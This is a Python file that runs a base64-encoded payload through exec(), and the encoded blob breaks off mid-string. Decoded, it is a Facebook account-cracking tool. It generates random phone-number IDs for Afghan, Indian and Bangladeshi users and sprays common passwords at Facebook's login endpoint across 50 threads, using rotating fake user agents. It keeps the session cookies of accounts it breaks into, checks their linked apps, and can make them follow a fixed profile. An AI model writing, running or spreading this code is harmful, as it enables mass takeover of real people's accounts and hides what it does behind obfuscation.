import base64
exec(base64.b64decode("CgppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHV1aWQKb3Muc3lzdGVtKCdnaXQgcHVsbCcpCm9zLnN5c3RlbSgncGtnIGluc3RhbGwgY3VybCcpCgpjbGFzcyBqYWxhbjoKICAgIAogICAgZGVmIF9faW5pdF9fKHNlbGYsIHopOgogICAgICAgIHBhc3MKCgoKZGVmIHVkKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBwcmludCgnIFsxXSBTVEFSVCAnKQogICAgcHJpbnQoJyBbMl0gRVhJVCcpCiAgICBvcHQgPSBpbnB1dCgnXG4gICBDaG9vc2Ugb3B0aW9uID4+PiAnKQogICAgaWYgb3B0ID09ICcxJzoKICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwNDEyNDg2NTk0OTYvJykKICAgICAgICBGRCgpCiAgICAgICAgcmV0dXJuIE5vbmUKICAgICNOb25lKCdcblx4MWJbMTszMW1FWElUXHgxYlswOzk3bScpCgoKZGVmIEZEKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBwcmludCgnXHgxYlsxOzMzbSBbMV0gRU5URVIgJykKICAgIHByaW50KCcgWzJdIEVYSVQnKQogICAgb3B0ID0gaW5wdXQoJ1xuICBceDFiWzE7MzJtIENob29zZSBvcHRpb24gPj4+ICcpCiAgICBpZiBvcHQgPT0gJzEnOgogICAgICAgIG9zLnN5c3RlbSgneGRnLW5vbicgKQogICAgICAgIG8oKQogICAgICAgIHJldHVybiBOb25lCiAgICAjTm9uZSgnXG5ceDFiWzE7MzFtRVhJVFx4MWJbMDs5N20nKQoKCmRlZiBvKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBwcmludCgnXHTDsMW44oCdwqXDsMW44oCdwqVSQU5ET00gTlVNQkVSIENSQUNLw7DFuOKAncKlw7DFuOKAncKlJykKICAgIHByaW50KCcnKQogICAgcHJpbnQoJ1x4MWJbMTszMm0gWzFdXHgxYlsxOzMzbSBSQU5ET00gQ1JBQ0sgJykKICAgIHByaW50KCdceDFiWzE7MzJtIFsyXSBceDFiWzE7MzJtQ09OVEFDVCBNRSBPTiBGQUNFQk9PSycpCiAgICAjcHJpbnQoJyBceDFiWzE7MzJtWzRdIFx4MWJbMTszMm1KT0lOIEZCIEdST1VQJykKICAgIHByaW50KCcgXHgxYlsxOzMybVswMF0gXHgxYlsxOzMxbUVYSVQnKQogICAgb3B0ID0gaW5wdXQoJ1xuICAgXHgxYlsxOzMybSBDaG9vc2Ugb3B0aW9uID4+PiAnKQogICAgaWYgb3B0ID09ICcxJzoKICAgICAgICBpKCkKICAgIGlmIE5vbmUgPT0gJzInOgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA0MTI0ODY1OTQ5NicpCiAgICAgICAgcmV0dXJuIE5vbmUKICAgIGlmIE5vbmUgPT0gJzAnOgogICAgICAgIG9zLnN5c3RlbSgnZXhpdCcpCiAgICAgICAgcmV0dXJuIE5vbmUKICAgICNOb25lKCdcblx4MWJbMTszMW0gIENob29zZSB2YWxpZCBvcHRpb25ceDFiWzA7OTdtJykKCgppbXBvcnQgb3Msc3lzLHRpbWUsanNvbixyYW5kb20scmUsc3RyaW5nLHBsYXRmb3JtLGJhc2U2NCx1dWlkCm9zLnN5c3RlbSgiZ2l0IHB1bGwiKQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3AKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAKaW1wb3J0IHJlcXVlc3RzIGFzIHJlc3MKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgd2FrdHUKdHJ5OgogICAgaW1wb3J0IHJlcXVlc3RzCiAgICBmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFRocmVhZFBvb2wKICAgIGltcG9ydCBtZWNoYW5pemUKICAgIGZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOgogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQogICAgCmRlZiBjZWtfYXBrKHNlc3Npb24sY29raSk6CiAgICB3PXNlc3Npb24uZ2V0KCJodHRwczovL2ZyZWUuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9YWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dAogICAgc29wID0gQmVhdXRpZnVsU291cCh3LCJodG1sLnBhcnNlciIpCiAgICB4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0iR0VUIikKICAgIGdhbWUgPSBbaS50ZXh0IGZvciBpIGluIHguZmluZF9hbGwoImgzIildCiAgICBpZiBsZW4oZ2FtZSk9PTA6CiAgICAgICAgcHJpbnQoZidcciVzWyVzISVzXSAlc1NvcnJ5IHRoZXJlIGlzIG5vIEFjdGl2ZSAgQXBrJXMgICclKE4sTSxOLE0sTikpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYnXHJbw7DFuMW9wq5dICVzIFx4MWJbMTs5NW0gw6LLnOKAoCBZb3VyIEFjdGl2ZSBBcHBzIMOiy5zigKAgICAgIDp7V0hJVEV9JyUoR1JFRU4pKQogICAgICAgIGZvciBpIGluIHJhbmdlKGxlbihnYW1lKSk6CiAgICAgICAgICAgIHByaW50KGYiXHJbJXMlc10gJXMlcyIlKE4saSsxLGdhbWVbaV0ucmVwbGFjZSgiRGl0YW1iYWhrYW4gcGFkYSIsIiBEaXRhbWJhaGthbiBwYWRhIiksTikpCiAgICAgICAgI2Vsc2U6CiAgICAgICAgICAgICNwcmludChmJ1xyICVzWyVzISVzXSBTb3JyeSwgQXBrIGNoZWNrIGZhaWxlZCBpbnZhbGlkIGNvb2tpZSclKE4sTSxOKSkKICAgIHc9c2Vzc2lvbi5nZXQoImh0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20vc2V0dGluZ3MvYXBwcy90YWJiZWQvP3RhYj1pbmFjdGl2ZSIsY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQKICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQogICAgeCA9IHNvcC5maW5kKCJmb3JtIixtZXRob2Q9IkdFVCIpCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQogICAgaWYgbGVuKGdhbWUpPT0wOgogICAgICAgIHByaW50KGYnXHIlc1slcyElc10gJXNTb3JyeSB0aGVyZSBpcyBubyBFeHBpcmVkIEFwayVzICAgICAgICAgICBcbiclKE4sTSxOLE0sTikpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYnXHJbw7DFuMW9wq5dICVzIFx4MWJbMTs5NW0gw6LigJTigKEgWW91ciBFeHBpcmVkIEFwcHMgw6LigJTigKEgICAgOntXSElURX0nJShNKSkKICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZ2FtZSkpOgogICAgICAgICAgICBwcmludChmIlxyWyVzJXNdICVzJXMiJShOLGkrMSxnYW1lW2ldLnJlcGxhY2UoIktlZGFsdXdhcnNhIiwiIEtlZGFsdXdhcnNhIiksTikpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJycpCiAKZGVmIGZvbGxvdyhzZWxmLCBzZXNzaW9uLCBjb2tpKToKICAgICAgICByID0gQmVhdXRpZnVsU291cChzZXNzaW9uLmdldCgnaHR0cHM6Ly9mcmVlLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMTUzMTUyNTg1MTknLCB7CiAgICAgICAgICAgICdjb29raWUnOiBjb2tpIH0sICoqKCdjb29raWVzJywpKS50ZXh0LCAnaHRtbC5wYXJzZXInKQogICAgICAgIGdldCA9IHIuZmluZCgnYScsICdJa3V0aScsICoqKCdzdHJpbmcnLCkpLmdldCgnaHJlZicpCiAgICAgICAgc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20nICsgc3RyKGdldCksIHsKICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQKICAgICAgICAgICAgCiAgICAgICAgICAgIAogCmNsYXNzIGphbGFuOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHopOgogICAgICAgIGZvciBlIGluIHogKyAiXG4iOgogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDAwMSkKICAgICAgICAgICAgClJFRCA9ICdcMDMzWzE7OTFtJwpXSElURSA9ICdcMDMzWzE7OTdtJwpHUkVFTiA9ICdcMDMzWzE7MzJtJyAjCllFTExPVyA9ICdcMDMzWzE7MzNtJwpCTFVFID0gJ1wwMzNbMTszNG0nCk9SQU5HRSA9ICdcMDMzWzE7MzVtJwpQID0gJ1x4MWJbMTs5N20nICMgUFVUSUgKTSA9ICdceDFiWzE7OTFtJyAjIE1FUkFICkggPSAnXHgxYlsxOzkybScgIyBISUpBVQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HCkIgPSAnXHgxYlsxOzk0bScgIyBCSVJVClUgPSAnXHgxYlsxOzk1bScgIyBVTkdVCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREEKTiA9ICdceDFiWzBtJyAgICAjIFdBUk5BIE1BVEkKQSA9ICdceDFiWzE7OTBtJyAjIFdBUk5BIEFCVSBBQlUKQk4gPSAnXHgxYlsxOzEwN20nICMgQkVMQUtBTkcgUFVUSUgKQkJMID0gJ1x4MWJbMTsxMDZtJyAjIEJFTEFLQU5HIEJJUlUgTEFOR0lUCkJQID0gJ1x4MWJbMTsxMDVtJyAjIEJFTEFLQU5HIFBJTksKQkIgPSAnXHgxYlsxOzEwNG0nICMgQkVMQUtBTkcgQklSVQpCSyA9ICdceDFiWzE7MTAzbScgIyBCRUxBS0FORyBLVU5JTkcKQkggPSAnXHgxYlsxOzEwMm0nICMgQkVMQUtBTkcgSElKQVUKQk0gPSAnXHgxYlsxOzEwMW0nICMgQkVMQUpBTkcgTUVSQUgKQkEgPSAnXHgxYlsxOzEwMG0nICMgQkVMQUtBTkcgQUJVIEFCVQpteV9jb2xvciA9IFsKIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dCndhcm5hID0gcmFuZG9tLmNob2ljZShteV9jb2xvcikKbm93ID0gZGF0ZXRpbWUubm93KCkKZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQp0YSA9IGN1cnJlbnQueWVhcgpidSA9IGN1cnJlbnQubW9udGgKaGEgPSBjdXJyZW50LmRheQp0b2RheSA9IGRhdGUudG9kYXkoKQpsb2dvPSgiIiJcMDMzWzE7OTJtCuKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilojiloggIOKWiOKWiOKWiOKWiOKWiCAg4paI4paIICAgIOKWiOKWiCAg4paI4paI4paI4paI4paIICBcMDMzWzE7OTJt4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiCAgIOKWiOKWiApcMDMzWzE7OTJt4paI4paIICAgICAg4paI4paIIOKWiOKWiCAgIOKWiOKWiCDilojiloggICAg4paI4paIIOKWiOKWiCAgIOKWiOKWiCBcMDMzWzE7OTJt4paI4paIICAgICAg4paI4paIICAg4paI4paIClwwMzNbMTs5N23ilojilojilojilojilojilojilogg4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilojiloggICAg4paI4paIIFwwMzNbMTs5N23ilojilojilojilojilojilojilogg4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiOKWiAogICAgIFwwMzNbMTs5MW3ilojilogg4paI4paIIOKWiOKWiCAgIOKWiOKWiCAg4paI4paIICDilojiloggIOKWiOKWiCAgIOKWiOKWiCAgICAgIFwwMzNbMTs5MW3ilojilogg4paI4paIICAg4paI4paIClwwMzNbMTs5MW3ilojilojilojilojilojilojilogg4paI4paIIOKWiOKWiCAgIOKWiOKWiCAgIOKWiOKWiOKWiOKWiCAgIFwwMzNbMTs5MW3ilojiloggICDilojilogg4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiCAgIOKWiOKWiApcMDMzWzE7MzJtPT09PT09PT09PT09PT09PT09PSBcMzNbMzJtU0lBVkFTSFwzM1swOzM3bSA9PT09PT09PT09PT09PT09PT09PT09PQpcMDMzWzE7MzJtICAgICBcMDMzWzE7MzNtQ1JFQVRFRCBCWVwzM1swO20gICA6ICBcMDMzWzE7MzNtUkFZRUVTIFNJQVZBU0gKXDAzM1sxOzMybSAgICAgXDAzM1sxOzMybUZBQ0VCT0sgICAgICA6IFwwMzNbMTszMm0gSEFKSSBTSUFWQVNIClwwMzNbMTszMm0gICAgIFwwMzNbMTszM21HSVRIVUIgICAgICAgOiAgXDAzM1sxOzMxbSBraW5nMTIyYWZnClwwMzNbMTszMm0gICAgIFwwMzNbMTszNG1UT09MIFNUQVRVUyAgOiAgXDAzM1sxOzM1bVRPT0wgSVMgRlJFRQpcMDMzWzE7MzJtICAgICBcMDMzWzE7MzZtVE9PTCBWSVJTSU9OIDogIFwwMzNbMTszNm0gMC4xClwwMzNbMTszN21+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fiBcMzNbMzI7NDVtQUZHXDMzWzA7bSAqKioqKioqKioqKioqKioqKioqKioqKioKIAogICAgICAgXDMzWzM3OzQxbVx0IENSRUFURUQgICBCWSAgIFJBWUVFUyAgIFNJQVZBU0ggXDMzWzA7bQogClwwMzNbMTszN209PT09PT09PT09PT09PT09PT09PSBcMzNbMzI7NDVtU0lBVkFTSFwzM1swO20gPT09PT09PT09PT09PT09PT09PT09PT09XG4iIiIpCmxvb3AgPSAwCm9rcyA9IFtdCmNwcyA9IFtdCiAKZGVmIGNsZWFyKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCmZyb20gdGltZSBpbXBvcnQgbG9jYWx0aW1lIGFzIGx0CmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBjbWQKbHR4ID0gaW50KGx0KClbM10pCmlmIGx0eCA+IDEyOgogICAgYSA9IGx0eC0xMgogICAgdGFnID0gIlBNIgplbHNlOgogICAgYSA9IGx0eAogICAgdGFnID0gIkFNIgogICAgCiAgICAKdHJ5OgogICAgcHJpbnQoJ1xuXG5cMDMzWzE7MzNtTG9hZGluZyBhc3NldCBmaWxlcyAuLi4gXDAzM1swOzk3bScpCiAgICB2ID0gNS4yCiAgICB1cGRhdGUgPSAoJzUuMicpCiAgICB1cGRhdGUgPSAoJzUuMicpCiAgICBpZiBzdHIodikgaW4gdXBkYXRlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgZWxzZTpwYXNzCmV4Y2VwdDpwcmludCgnXG5cMDMzWzE7MzFtTm8gaW50ZXJuZXQgY29ubmVjdGlvbiAuLi4gXDAzM1swOzk3bScpCiNnbG9iYWwgZnVuY3Rpb25zCmRlZiBkeW5hbWljKHRleHQpOgogICAgdGl0aWsgPSBbJy4gICAnLCcuLiAgJywnLi4uICcsJy4uLi4gJ10KICAgIGZvciBvIGluIHRpdGlrOgogICAgICAgIHByaW50KCdccicrdGV4dCtvKSwKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQogCiNVc2VyIGFnZW50cwp1Z2VuMj1bXQp1Z2VuPVtdCiAKZm9yIHhkIGluIHJhbmdlKDEwMDAwKToKICAgIGFhPSdNb3ppbGxhLzUuMCAoTW9iaWxlOyBydjo0OC4wOyBBNDA1REwnCiAgICBiPXJhbmRvbS5jaG9pY2UoWyczJywnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1JywnMTYnLCcxNyddKQogICAgYz0nIGVuLXVzOyBHVC0nCiAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKICAgIGY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBnPSdHZWNrby80OC4wIEZpcmVmb3gvNDguMCBLQUlPUy8yLjUvJwogICAgaD1yYW5kb20ucmFuZHJhbmdlKDczLDEwMCkKICAgIGk9JzAnCiAgICBqPXJhbmRvbS5yYW5kcmFuZ2UoNDIwMCw0OTAwKQogICAgaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkKICAgIGw9J01vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgdWFrdTI9KGYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScpCiAgICB1Z2VuLmFwcGVuZCh1YWt1MikKICAgIAojIEFQSyBDSEVDSwpkZWYgaSgpOgogICAgdXNlcj1bXQogICAgdHdmID1bXQogICAgb3MuZ2V0dWlkCiAgICBvcy5nZXRldWlkCiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHByaW50KGxvZ28pCiAgICAKICAgIAogICAgcHJpbnQoIlwwMzNbMTszN21cdCAaIFVTRSBPVVIgQ09VTlRSWSBDT0RFIBogIikKICAgIHByaW50KCdcMDMzWzE7MzZtICAgICBcdCAgICAgQUZHIENPREVTXG4gICAgIFwwMzNbMTszM205Mzc5LCBcMDMzWzE7MzNtOTM3MCAsXDAzM1sxOzMzbTkzNzcgLFwwMzNbMTszM205Mzc4ICAuLi5cMDMzWzA7OTdtJykKICAgIHByaW50KCdcMDMzWzE7MzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQogICAgcHJpbnQoJ1wwMzNbMTszNm0gICAgIFx0ICAgICBJTkRJQSBDT0RFU1xuICAgICBcMDMzWzE7MzNtOTE3NzgsIFwwMzNbMTszM205MTkzMCAsXDAzM1sxOzMzbTkxOTAyICxcMDMzWzE7MzNtOTE3MTIgIC4uLlwwMzNbMDs5N20nKQogICAgcHJpbnQoJ1wwMzNbMTszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpCiAgICBwcmludCgnXDAzM1sxOzM2bSAgICAgXHQgICAgIEJEIENPREVTXG4gICAgIFwwMzNbMTszM204ODAxNiwgXDAzM1sxOzMzbTg4MDE3ICxcMDMzWzE7MzNtODgwMTggLFwwMzNbMTszM204ODAxOSAgLi4uXDAzM1swOzk3bScpCiAgICBwcmludCgnXDAzM1sxOzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4nKQogICAgY29kZSA9IGlucHV0KCcgUFVUIENPREUgOiAnKQogICAgcHJpbnQoIiIpCiAgICBsaW1pdCA9IGludChpbnB1dCgnIEVYQU1QTEU6IDIwMDAsIDMwMDAsIDUwMDAwLCAxMDAwMDBcblxuIFBVVCBDTE9OSU5HIExJTUlUOiAnKSkKICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToKICAgICAgICBubXAgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoNykpCiAgICAgICAgdXNlci5hcHBlbmQobm1wKQogICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBwcmludChsb2dvKQogICAgcHJpbnQgKCdSZWNvbWVuZCBQQVNTV09SRCBcMDMzWzE7MzJtIGFmZ2hhbjEyMywg27Hbstuz27Tbtdu2LCAxMDAwMTAwMCwgNTAwNTAwIGthYnVsMTIzICwxMDAxMDAsIGtoYW4xMjM0LCBraGFuMTIsIGtoYW43ODYsIDIwMDIwMCAnKQogICAgcGFzc3ggPSBpbnQoaW5wdXQoIlwwMzNbMTs5MG1bKl0gRW50ZXIgUGFzc3dvcmQgTGltaXQgOiAiKSkKICAgIEhhbWlpSUQgPSBbXQogICAgcHJpbnQoIiIpCiAgICBmb3IgYmlsYWwgaW4gcmFuZ2UocGFzc3gpOgogICAgICAgIHB3dyA9IGlucHV0KCJbKl0gRW50ZXIgUGFzc3dvcmQgOiAiKQogICAgICAgIEhhbWlpSUQuYXBwZW5kKHB3dykKICAgIHdpdGggVGhyZWFkUG9vbChtYXhfd29ya2Vycz01MCkgYXMgbWFuc2hlcmE6CiAgICAgICAgY2xlYXIoKQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkKICAgICAgICBwcmludCgnXDAzM1sxOzM2bSBUT1RBTCBJRFM6ICcrdGwpCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszNm0gVEhFIFBST0NFU1MgSEFTIEJFRU4gU1RBUlRFRCcpCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszMW0gVVNFIEFFUk9QTEFORSBNT09EIElOIEVWRVJZIDUgTUlOICcpCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpCiAgICAgICAgZm9yIGxvdmUgaW4gdXNlcjoKICAgICAgICAgICAgcHd4ID0gW2xvdmVbMTpdXQogICAgICAgICAgICB1aWQgPSBjb2RlK2xvdmUKICAgICAgICAgICAgZm9yIEVtYW4gaW4gSGFtaWlJRDoKICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQoRW1hbikKICAgICAgICAgICAgbWFuc2hlcmEuc3VibWl0KHJjcmFjayx1aWQscHd4LHRsKQogICAgcHJpbnQoJ1wwMzNbMTszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpCiAgICBwcmludCgnQ3JhY2sgcHJvY2VzcyBoYXMgYmVlbiBjb21wbGV0ZWQnKQogICAgcHJpbnQoJ0lkcyBzYXZlZCBpbiBvay50eHQsY3AudHh0JykKICAgIHByaW50KCdcMDMzWzE7MzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQogCmRlZiByY3JhY2sodWlkLHB3eCx0bCk6CiAgICAjcHJpbnQodXNlcikKICAgIGdsb2JhbCBsb29wCiAgICBnbG9iYWwgY3BzCiAgICBnbG9iYWwgb2tzCiAgICBnbG9iYWwgcHJveHkKICAgIHRyeToKICAgICAgICBmb3IgcHMgaW4gcHd4OgogICAgICAgICAgICBwcm8gPSByYW5kb20uY2hvaWNlKHVnZW4pCiAgICAgICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkKICAgICAgICAgICAgZnJlZV9mYiA9IHNlc3Npb24uZ2V0KCdodHRwczovL3AuZmFjZWJvb2suY29tJykudGV4dAogICAgICAgICAgICBsb2dfZGF0YSA9IHsKICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwKICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksCiAgICAgICAgICAgICJtX3RzIjpyZS5zZWFyY2goJ25hbWU9Im1fdHMiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLAogICAgICAgICAgICAibGkiOnJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLAogICAgICAgICAgICAidHJ5X251bWJlciI6IjAiLAogICAgICAgICAgICAidW5yZWNvZ25pemVkX3RyaWVzIjoiMCIsCiAgICAgICAgICAgICJlbWFpbCI6dWlkLAogICAgICAgICAgICAicGFzcyI6cHMsCiAgICAgICAgICAgICJsb2dpbiI6IkxvZyBJbiJ9CiAgICAgICAgICAgIGhlYWRlcl9mcmVlZmIgPSB7J2F1dGhvcml0eSc6ICdwLmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgIm1ldGhvZCIgOiAnR0VUJywKICAgICAgICAgICAic2NoZW1lIjogJ2h0dHBzJywKICAgICAgICAgICAgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgIAkJJ3NlYy1jaC11YSc6ICciKE5vdChBOkJyYW5kIjt2PSI5OSIsCQkiQ2hyb21pdW0iO3Y9IjExMiIsICJPcGVyYSI7dj0iOTYiJywKICAgIAkJJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzAnLAogIAkJICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJtYWNPUyInLAogCQkgICAnc2VjLWNoLXVhLXBsYXRmb3JtLXZlcnNpb24nOiAnIiInLAogCQkgICAnc2VjLWNoLXVhLWZ1bGwtdmVyc2lvbi1saXN0JzogJyIoTm90KEE6QnJhbmQiO3Y9Ijk5LjAuMC4wIiwgIkNocm9taXVtIjt2PSIxMTIuMC41NjY5LjIyMSIsICJPcGVyYSI7dj0iOTYuMC4zNzU5Ljk1IicsCiAgIAkJICdzZWMtY2gtcHJlZmVycy1jb2xvci1zY2hlbWUnOiAnbGlnaHQnLAogICAJCSAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywKICAJCSAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjU2NjkuMjIxIFNhZmFyaS81MzcuMzYgT1BSLzk2LjAuMzc1OS45NScsCiAgIAkJICdhY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JywKICAgIAkJJ3NlYy1mZXRjaC1zaXRlJzogJ25vbmUnLAogICAJCSAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLAogICAJCSAnc2VjLWZldGNoLXVzZXInOiAnPzEnLAogCQkgICAnc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLAogICAJCSAnYWNjZXB0LWxhbmd1YWdlJzogJ2ZhLUlSLGZhO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JywKICAgICAgICAgICAgInByYWdtYSI6ICAnbm8tY2FjaGUnLAogICAgICAgICAgICAicHJpb3JpdHkiOiAndT0wJywKICAgICAgICAgICAgJ2Nyb3NzLW9yaWdpbi1yZXNvdXJjZS1wb2xpY3knOiAnY3Jvc3Mtb3JpZ2luJywKICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiAnMScsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgbG8gPSBzZXNzaW9uLnBvc3QoJ2h0dHBzOi8vcC5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vP3JlZnNyYycsZGF0YT1sb2dfZGF0YSxoZWFkZXJzPWhlYWRlcl9mcmVlZmIpLnRleHQKICAgICAgICAgICAgbG9nX2Nvb2tpZXM9c2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkua2V5cygpCiAgICAgICAgICAgIGlmICdjX3VzZXInIGluIGxvZ19jb29raWVzOgogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQogICAgICAgICAgICAgICAgY2lkID0gY29raVsxNTE6MTY2XQogICAgICAgICAgICAgICAgcHJpbnQoJyAgICBcMDMzWzE7MzJtKFNJQVZBU0ggLU9Lw7DFuOKAncKlKSAgJyArY2lkKyAnIHwgJyArcHMrICAgICcgIFxuIFwwMz